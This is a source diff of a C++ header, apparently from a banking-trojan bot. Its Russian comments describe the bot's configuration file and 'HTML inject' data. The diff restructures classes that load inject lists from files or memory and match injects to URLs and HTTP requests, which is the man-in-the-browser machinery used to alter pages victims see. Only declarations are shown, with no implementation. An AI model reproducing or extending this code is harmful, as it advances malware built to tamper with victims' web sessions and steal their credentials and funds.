@@ -33,44 +33,7 @@
 
 const static char ConfigSignature[] = {'B', 'J', 'B', 0};
 
-DWORD GetConfigTimeOut();
-char* GetCurrentHostFromConfig(int Num);
-void GetCurrentConfigHostSetings(bool*http, bool*https);
-
-
-//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-//
-//  Методы для работы с конфигурационным файлом бота
-//
-//
-//  ВАЖНО!!!!!! Некоторые опции конфига доступны только для визуальных
-//              приложений
-//				добавить имя BV_APP в имена препроцесора
-//
-//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-
-
-
-/*
-enum TInjectDataState {idsUnknown, idsOk, idsError};
-
-typedef struct THTMLInjectData
-{
-	PCHAR Before;
-	PCHAR Inject;
-	PCHAR After;
-	TInjectDataState State;
-    DWORD MacrosHash;  // Хэш данных  для определения макроса инжекта
-	bool Disabled;     // Не использовать инжект (Для отладочной программы)
-	LPVOID Owner;      // Указатель на инжект владелец данных
-	DWORD  ID;         // Ижентификатор, Для внутренних нужд
-
-}*PHTMLInjectData;
-
-*/
-
-
-
+class TBotConfig;
 class THTMLInjectList;
 class THTMLInject;
 class THTMLInjectData;
@@ -84,18 +47,29 @@ class THTMLInjectList :  public TEventContainer
 {
 private:
 	PList FInjects;
+	RTL_CRITICAL_SECTION FLock;
 
 	friend class THTMLInject;
+	friend class TBotConfig;
+protected:
+	void Lock();
+	void Unlock();
+	bool GetInjectsForURL(THTTPMethod Method, const char *URL, PList List);
 public:
 	THTMLInjectList();
 	~THTMLInjectList();
 
-	inline DWORD Count() const { return List::Count(FInjects); };
-	inline THTMLInject* Items(int Index) const { return (THTMLInject*)List::GetItem(FInjects, Index); }
-	inline THTMLInject* operator[](int Index) const { return Items(Index);};
+
 	THTMLInject* AddInject();
 	void ResetInjectsStatus();
 	void Clear();
+	bool LoadFromMem(LPVOID Buf, DWORD BufSize);
+	void ReleaseInjects(PList Injects);
+	bool GetInjectsForRequest(PRequest Request);
+
+	inline DWORD Count() const { return List::Count(FInjects); };
+	inline THTMLInject* Items(int Index) const { return (THTMLInject*)List::GetItem(FInjects, Index); }
+	inline THTMLInject* operator[](int Index) const { return Items(Index);};
 };
 
 
@@ -131,12 +105,13 @@ public:
 };
 
 
-//---------------------------------------------
-//  THTMLInjectData - данные HTML инжекта
-//---------------------------------------------
+
 enum TInjectDataState {idsUnknown, idsOk, idsError};
 
 
+//---------------------------------------------
+//  THTMLInjectData - данные HTML инжекта
+//---------------------------------------------
 class THTMLInjectData : public TEventContainer
 {
 private:
@@ -163,6 +138,24 @@ public:
 
 
 
+//***********************************************************
+//  TBotConfig  - Настройки бота из конфигурационного файла
+//***********************************************************
+class TBotConfig : public TBotObject
+{
+public:
+	THTMLInjectList *HTMLInjects;
+
+	TBotConfig();
+	~TBotConfig();
+
+	void Clear();
+	bool LoadFromFile(const string &FileName);
+};
+
+
+
+
 //---------------------------------------------------------
 // TBotConfig -  Настройки работы бота
 //---------------------------------------------------------
@@ -172,7 +165,8 @@ typedef struct TBotConfig_
 	RTL_CRITICAL_SECTION Lock;  // Критичиская секция блокировки конфига
 	PWCHAR LastConfigFile;      // Имя последнего загруженного файла
 	FILETIME ConfigTime;        // Время изменения загруженного файла
-} *PBotConfig;
+} *PBotConfig_;
+
 
 
 
@@ -194,10 +188,10 @@ typedef struct TBotConfig_
 namespace Config
 {
 	// Функция создаёт структуру конфига
-	PBotConfig Create();
+//	PBotConfig Create();
 
 	// Функция уничтожает структуру конфига
-	void Free(PBotConfig Cfg);
+//	void Free(PBotConfig Cfg);
 
 	//*********************************************************
 	//	Initialize - Инициализировать глобальные
@@ -206,13 +200,13 @@ namespace Config
 	//  	случае настройки будут прочитаны из файла вшитого
 	//		в код бота.
 	//*********************************************************
-	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);
+//	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);
 
 	// Функция возвращает указатель на конфиг бота
-	PBotConfig GetConfig();
+	TBotConfig* GetConfig();
 
 	// Очистить конфиг
-	void Clear(PBotConfig Config);
+	//void Clear(PBotConfig Config);
 
 	//  Функция возврашает имя файла по умолчанию
 	//
@@ -234,7 +228,7 @@ namespace Config
 	bool IsInjectURL(PCHAR URL, THTTPMethod Method);
 
 	// Функция загружает конфиг из файла
-	bool LoadConfigFromFile(PBotConfig Config, PWCHAR FileName);
+//	bool LoadConfigFromFile(TBotConfig *Config, PWCHAR FileName);
 }
 
 
